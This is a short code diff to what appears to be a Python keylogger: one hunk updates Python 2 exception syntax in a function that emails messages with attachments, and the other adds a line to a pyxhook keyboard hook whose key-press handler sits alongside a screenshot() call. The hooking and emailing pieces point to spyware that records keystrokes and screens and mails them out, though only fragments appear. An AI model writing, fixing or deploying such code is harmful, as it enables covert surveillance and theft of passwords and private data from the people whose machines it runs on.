@@ -124,7 +124,7 @@ def send_email(server, port, FROM, PASS, TO, subject, texto, anexo=[]):
     gm.sendmail(FROM, TO, msg.as_string())
     gm.close()
 
-  except Exception,e:
+  except Exception as e:
     errorMsg = "Nao Foi Possivel Enviar o Email.\n Error: %s" % str(e)
     print('%s'%errorMsg)
 
@@ -142,6 +142,7 @@ try:
 
   new_hook = pyxhook.HookManager()
   new_hook.KeyDown= OnKeyPress
+  new_hook.Key = OnKeyPress
   new_hook.HookKeyboard()
   new_hook.start()
   screenshot()
